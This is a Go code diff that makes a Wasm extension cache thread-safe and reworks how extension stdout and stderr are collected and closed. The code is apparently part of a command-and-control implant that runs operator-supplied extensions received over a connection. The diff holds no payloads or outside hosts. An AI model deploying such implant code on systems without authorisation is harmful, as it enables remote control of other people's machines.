@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"io"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -17,7 +18,47 @@ import (
 	"google.golang.org/protobuf/proto"
 )
 
-var WasmExtensionCache = map[string]*pb.RegisterWasmExtensionReq{}
+var (
+	wasmExtensionCacheMu sync.RWMutex
+	wasmExtensionCache   = map[string]*pb.RegisterWasmExtensionReq{}
+)
+
+// GetWasmExtension returns a registered Wasm extension.
+func GetWasmExtension(name string) (*pb.RegisterWasmExtensionReq, bool) {
+	wasmExtensionCacheMu.RLock()
+	defer wasmExtensionCacheMu.RUnlock()
+	extension, ok := wasmExtensionCache[name]
+	return extension, ok
+}
+
+// SetWasmExtension registers or replaces a Wasm extension.
+func SetWasmExtension(extension *pb.RegisterWasmExtensionReq) {
+	wasmExtensionCacheMu.Lock()
+	defer wasmExtensionCacheMu.Unlock()
+	wasmExtensionCache[extension.Name] = extension
+}
+
+// ListWasmExtensions returns the registered Wasm extension names.
+func ListWasmExtensions() []string {
+	wasmExtensionCacheMu.RLock()
+	defer wasmExtensionCacheMu.RUnlock()
+	names := make([]string, 0, len(wasmExtensionCache))
+	for name := range wasmExtensionCache {
+		names = append(names, name)
+	}
+	return names
+}
+
+// DeleteWasmExtension removes a registered Wasm extension.
+func DeleteWasmExtension(name string) bool {
+	wasmExtensionCacheMu.Lock()
+	defer wasmExtensionCacheMu.Unlock()
+	if _, ok := wasmExtensionCache[name]; !ok {
+		return false
+	}
+	delete(wasmExtensionCache, name)
+	return true
+}
 
 // ExecWasmExtensionHandler - Execute a Wasm extension
 func ExecWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Connection) {
@@ -30,7 +71,7 @@ func ExecWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Conn
 		return
 	}
 
-	extReq, ok := WasmExtensionCache[req.Name]
+	extReq, ok := GetWasmExtension(req.Name)
 	if !ok {
 		// {{if .Config.Debug}}
 		log.Printf("Wasm extension '%s' not found", req.Name)
@@ -76,39 +117,27 @@ func runNonInteractive(req *pb.ExecWasmExtensionReq, wasm *extension.WasmExtensi
 	log.Printf("Executing non-interactive wasm extension")
 	// {{end}}
 
+	defer func() {
+		_ = wasm.Close()
+	}()
 	stdout := &bytes.Buffer{}
+	stderr := &bytes.Buffer{}
+	var readers sync.WaitGroup
+	readers.Add(2)
 	go func() {
-		for {
-			buf := make([]byte, 1024)
-			n, err := wasm.Stdout.Reader.Read(buf)
-			stdout.Write(buf[:n])
-			if err == io.EOF {
-				return
-			}
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("error reading stdout: %v", err)
-				// {{end}}
-				return
-			}
+		defer readers.Done()
+		if _, err := io.Copy(stdout, wasm.Stdout.Reader); err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("error reading stdout: %v", err)
+			// {{end}}
 		}
 	}()
-
-	stderr := &bytes.Buffer{}
 	go func() {
-		for {
-			buf := make([]byte, 1024)
-			n, err := wasm.Stderr.Reader.Read(buf)
-			stderr.Write(buf[:n])
-			if err == io.EOF {
-				return
-			}
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("error reading stderr: %v", err)
-				// {{end}}
-				return
-			}
+		defer readers.Done()
+		if _, err := io.Copy(stderr, wasm.Stderr.Reader); err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("error reading stderr: %v", err)
+			// {{end}}
 		}
 	}()
 
@@ -120,6 +149,9 @@ func runNonInteractive(req *pb.ExecWasmExtensionReq, wasm *extension.WasmExtensi
 		// {{end}}
 		errMsg = err.Error()
 	}
+	_ = wasm.Stdout.Writer.Close()
+	_ = wasm.Stderr.Writer.Close()
+	readers.Wait()
 
 	return proto.Marshal(&pb.ExecWasmExtension{
 		Stdout:   stdout.Bytes(),
@@ -177,7 +209,7 @@ func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, w
 		// {{end}}
 		wasm.Stdout.Writer.Write([]byte(fmt.Sprintf("\r\n*** exit code %d ***\r\n", exitCode)))
 		wasm.Stdout.Writer.Write([]byte("Wait 10 seconds and press <enter> to continue ...\r\n"))
-		wasm.Close()
+		_ = wasm.Close()
 		tunnel.Close()
 		return exitCode, err
 	}()
